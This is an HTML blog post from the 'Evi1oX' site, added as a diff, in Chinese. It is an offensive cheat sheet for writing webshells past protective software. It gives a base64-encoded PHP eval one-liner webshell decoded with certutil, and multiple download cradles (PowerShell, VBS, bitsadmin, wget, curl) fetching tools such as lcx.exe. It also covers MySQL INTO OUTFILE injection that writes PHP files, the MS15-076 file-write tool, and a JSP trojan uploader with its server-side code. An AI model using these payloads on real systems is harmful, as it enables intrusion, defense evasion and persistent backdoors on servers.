@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>bypass-waf-put-Webshell - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="利用常见的系统工具进行编码解码绕过某些防护软件写入webshell 0x01 编码绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # mshta vbscript:createobject(&amp;#34;scripting.filesystemobject&amp;#34;).createtextfile(&amp;#34;yijuhua.txt&amp;#34;,2,ture).writeline(&amp;#34;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8&#43;Cg==&amp;#34;)(window.close) # certutil -decode yijuhua.txt shell.txt # type shell.txt # echo 48 65 6C 6C" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/bypass-waf-put-webshell/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="bypass-waf-put-Webshell" />
+<meta property="og:description" content="利用常见的系统工具进行编码解码绕过某些防护软件写入webshell 0x01 编码绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # mshta vbscript:createobject(&#34;scripting.filesystemobject&#34;).createtextfile(&#34;yijuhua.txt&#34;,2,ture).writeline(&#34;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8&#43;Cg==&#34;)(window.close) # certutil -decode yijuhua.txt shell.txt # type shell.txt # echo 48 65 6C 6C" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/bypass-waf-put-webshell/" />
+<meta property="article:published_time" content="2017-05-31T15:27:01&#43;00:00"/>
+<meta property="article:modified_time" content="2017-05-31T15:27:01&#43;00:00"/>
+
+<meta itemprop="name" content="bypass-waf-put-Webshell">
+<meta itemprop="description" content="利用常见的系统工具进行编码解码绕过某些防护软件写入webshell 0x01 编码绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # mshta vbscript:createobject(&#34;scripting.filesystemobject&#34;).createtextfile(&#34;yijuhua.txt&#34;,2,ture).writeline(&#34;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8&#43;Cg==&#34;)(window.close) # certutil -decode yijuhua.txt shell.txt # type shell.txt # echo 48 65 6C 6C">
+
+
+<meta itemprop="datePublished" content="2017-05-31T15:27:01&#43;00:00" />
+<meta itemprop="dateModified" content="2017-05-31T15:27:01&#43;00:00" />
+<meta itemprop="wordCount" content="1010">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="bypass-waf-put-Webshell"/>
+<meta name="twitter:description" content="利用常见的系统工具进行编码解码绕过某些防护软件写入webshell 0x01 编码绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # mshta vbscript:createobject(&#34;scripting.filesystemobject&#34;).createtextfile(&#34;yijuhua.txt&#34;,2,ture).writeline(&#34;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8&#43;Cg==&#34;)(window.close) # certutil -decode yijuhua.txt shell.txt # type shell.txt # echo 48 65 6C 6C"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">bypass-waf-put-Webshell</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x01-编码绕过">0x01 编码绕过</a></li>
+<li><a href="#0x02-将命令转换为powershell兼容的编码字符串">0x02 将命令转换为Powershell兼容的编码字符串</a></li>
+<li><a href="#0x03-mysql">0x03 Mysql</a></li>
+<li><a href="#0x04-存在命令执行echo">0x04 存在命令执行echo</a></li>
+<li><a href="#0x05-ms15-076任意文件写入-https-github-com-monoxgas-trebuchet">0x05 <a href="https://github.com/monoxgas/Trebuchet">MS15-076任意文件写入</a></a></li>
+<li><a href="#0x06-vbs脚本上传2">0x06 vbs脚本上传2</a></li>
+<li><a href="#0x07-linux">0x07 Linux</a></li>
+<li><a href="#0x08-struts上传exp-win">0x08 struts上传exp [win]</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>利用常见的系统工具进行编码解码绕过某些防护软件写入webshell</p>
+
+<h1 id="0x01-编码绕过">0x01 编码绕过</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"># mshta vbscript:createobject(&#34;scripting.filesystemobject&#34;).createtextfile(&#34;yijuhua.txt&#34;,2,ture).writeline(&#34;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+Cg==&#34;)(window.close)
+# certutil -decode yijuhua.txt shell.txt
+# type shell.txt
+
+# echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 &gt;hex.txt
+&gt; 生成 hex.txt，机器码对应的内容是 Hello World!
+
+# certutil -decodehex hex.txt bin.txt
+&gt; Hex解码
+
+# certutil -encode bin.txt Encode.txt
+&gt; Base64编码
+
+# certutil -decode Encode.txt Decode.txt
+&gt; Base64解码</code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x02-将命令转换为powershell兼容的编码字符串">0x02 将命令转换为Powershell兼容的编码字符串</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># command</span>
+<span class="n">echo</span> <span class="s2">&#34;iex(command)&#34;</span> <span class="p">|</span> <span class="n">iconv</span> <span class="p">-</span><span class="n">-to-code</span> <span class="n">UTF</span><span class="p">-</span><span class="n">16LE</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-w</span> <span class="n">0</span>
+
+<span class="c"># powershell一行命令下载1</span>
+<span class="n">powershell</span> <span class="nv">$client</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span><span class="nv">$client</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;https://baidu.com&#39;</span><span class="p">,</span><span class="s1">&#39;file.name&#39;</span><span class="p">)</span>
+<span class="c"># powershell一行命令下载2</span>
+<span class="nb">Invoke-WebRequest</span> <span class="n">-uri</span> <span class="s1">&#39;https://baidu.com&#39;</span> <span class="n">-OutFile</span> <span class="s1">&#39;file.name&#39;</span>
+<span class="c"># 有时候需要写批处理实现</span>
+<span class="n">echo</span> <span class="n">powershell</span> <span class="nv">$client</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span><span class="nv">$client</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;https://baidu.com&#39;</span><span class="p">,</span><span class="s1">&#39;file.name&#39;</span><span class="p">)</span> <span class="p">&gt;</span> <span class="n">1</span><span class="p">.</span><span class="n">bat</span>
+<span class="c"># 注意在不同环境中特殊字符的转码</span>
+
+<span class="c"># Python</span>
+<span class="n">from</span> <span class="n">base64</span>
+<span class="n">import</span> <span class="n">b64encode</span>
+
+<span class="c"># Ruby</span>
+<span class="n">require</span> <span class="s2">&#34;base64&#34;</span>
+<span class="n">Base64</span><span class="p">.</span><span class="n">encode64</span><span class="p">(</span><span class="s1">&#39;iex(command)&#39;</span><span class="p">.</span><span class="n">force_encoding</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">))</span>
+<span class="n">b64encode</span><span class="p">(</span><span class="s1">&#39;iex(command)&#39;</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">))</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/windows_write_shell.png" alt="图片已损坏" title="Windows" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;</span> <span class="p">|</span> base64
+<span class="nb">echo</span> PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+Cg<span class="o">==</span> <span class="p">|</span> base64 -D <span class="p">|</span> tee yijuhua.txt
+cat yijuhua.txt</code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/write_getshell1.png" alt="图片已损坏" title="Linux" /></p>
+
+<h1 id="0x03-mysql">0x03 Mysql</h1>
+
+<blockquote>
+<p>利用条件：<br />
+    root权限<br />
+    GPC关闭（能使用单引号）<br />
+    有绝对路径（读文件可以不用，写文件必须）<br />
+    没有配置–secure-file-priv</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="p">.</span><span class="k">union</span>
+<span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="s1">&#39;&lt;? phpinfo(); ?&gt;&#39;</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">&#39;C:\\phpinfo.php&#39;</span><span class="o">%</span><span class="mi">23</span>
+
+<span class="mi">2</span><span class="p">.</span><span class="k">no</span> <span class="k">union</span>
+<span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">&#39;C:\\yijuhua.php&#39;</span> <span class="n">fields</span> <span class="n">terminated</span> <span class="k">by</span> <span class="s1">&#39;&lt;? phpinfo(); ?&gt;&#39;</span><span class="o">%</span><span class="mi">23</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/mysql_writeshell2.png" alt="图片已损坏" /></p>
+
+<h1 id="0x04-存在命令执行echo">0x04 存在命令执行echo</h1>
+
+<p>没有web物理路径写webshell，路径可以通过搜索文件得到，右键看源码随便找个的js文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">dir /s/b 驱动器号:\example.js 获取绝对路径</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x05-ms15-076任意文件写入-https-github-com-monoxgas-trebuchet">0x05 <a href="https://github.com/monoxgas/Trebuchet">MS15-076任意文件写入</a></h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">trebuchet.exe c:\1.txt c:\2.txt</pre></td></tr></table>
+</div>
+</div>
+<p>lpk.dll劫持，mysql-udf导入</p>
+
+<h1 id="0x06-vbs脚本上传2">0x06 vbs脚本上传2</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs">echo Set Post = CreateObject(&#34;Msxml2.XMLHTTP&#34;) &gt;&gt;1.vbs
+echo Set Shell = CreateObject(&#34;Wscript.Shell&#34;) &gt;&gt;1.vbs
+echo Post.Open &#34;GET&#34;,&#34;http://baidu.com&#34;,0 &gt;&gt;1.vbs
+echo Post.Send() &gt;&gt;1.vbs
+echo Set aGet = CreateObject(&#34;ADODB.Stream&#34;) &gt;&gt;1.vbs
+echo aGet.Mode = 3 &gt;&gt;1.vbs
+echo aGet.Type = 1 &gt;&gt;1.vbs
+echo aGet.Open() &gt;&gt;1.vbs
+echo aGet.Write(Post.responseBody) &gt;&gt;1.vbs
+echo aGet.SaveToFile &#34;1.html&#34;,2 &gt;&gt;1.vbs
+start 1.vbs</code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x07-linux">0x07 Linux</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wget https://04z.net -O <span class="m">1</span>.html
+curl -o <span class="m">1</span>.html https://04z.net
+python -c <span class="s2">&#34;import urllib;urllib.urlretrieve(&#39;https://04z.net&#39;, &#39;1.txt&#39;)&#34;</span>
+ruby -e <span class="s2">&#34;require &#39;open-uri&#39;;File.open(&#39;1.txt&#39;, &#39;wb&#39;) {|f| f.write(open(&#39;https://04z.net&#39;) {|f1| f1.read})}&#34;</span>
+perl -e <span class="s2">&#34;use LWP::Simple;getstore(&#39;http://baidu.com&#39;, &#39;1.txt&#39;);&#34;</span>
+        <span class="c1"># 这个只能http，https的话需要LWP::UserAgent;</span>
+nc <span class="o">[</span>server<span class="o">]</span> nc -l <span class="m">5678</span> &gt; <span class="m">1</span>.tar  <span class="o">[</span>client<span class="o">]</span>nc servre_ip <span class="m">5678</span> &lt; <span class="m">1</span>.tar</code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x08-struts上传exp-win">0x08 struts上传exp [win]</h1>
+
+<p><strong>cmd远程下载</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">bitsadmin /transfer ChromeDownloadjob  /download /priority normal http://04z.net/ngrok.sh  %UserProfile%\Desktop\ngrok.sh</pre></td></tr></table>
+</div>
+</div>
+<p><strong>vbs下载</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs">Download &#34;http://04z.net/lcx.exe&#34;, &#34;lcx.exe&#34;
+Function Download(strUrl, strFile)
+Set xHttp = CreateObject(&#34;MSXML2.ServerXMLHTTP&#34;)
+xHttp.Open &#34;GET&#34;, strUrl,0
+xHttp.Send()
+Set bStrm= CreateObject(&#34;ADODB.Stream&#34;)
+with bStrm
+    .type = 1 &#39;//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile strFile, 2 &#39;//overwrite
+end with
+End Function</code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>jsp木马连接器</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>JSP一句话木马客户端<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">font</span> <span class="na">color</span><span class="o">=</span><span class="s">red</span><span class="p">&gt;</span>专用JSP木马连接器<span class="p">&lt;/</span><span class="nt">font</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">get</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>服务端地址<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">url</span> <span class="na">size</span><span class="o">=</span><span class="s">110</span> <span class="na">type</span><span class="o">=</span><span class="s">text</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">name</span><span class="o">=</span><span class="s">t</span> <span class="na">rows</span><span class="o">=</span><span class="s">30</span> <span class="na">cols</span><span class="o">=</span><span class="s">120</span><span class="p">&gt;</span>你提交的代码<span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>保存成的文件名：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">f</span> <span class="na">size</span><span class="o">=</span><span class="s">30</span> <span class="na">value</span><span class="o">=</span><span class="s">shell.jsp</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;javascript:get.action=document.get.url.value;get.submit()&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">提交</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>服务端代码:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">rows</span><span class="o">=</span><span class="s">5</span> <span class="na">cols</span><span class="o">=</span><span class="s">120</span><span class="p">&gt;</span><span class="err">&lt;</span>%if(request.getParameter(&#34;f&#34;)!=null)(new java.io.FileOutputStream(application.getRealPath(&#34;\&#34;)+request.getParameter(&#34;f&#34;))).write(request.getParameter(&#34;t&#34;).getBytes());%&gt;<span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span></code></pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/meterpreter-tips/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Meterpreter-Tips</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/friends/">
+            <span class="next-text nav-default">About Me</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
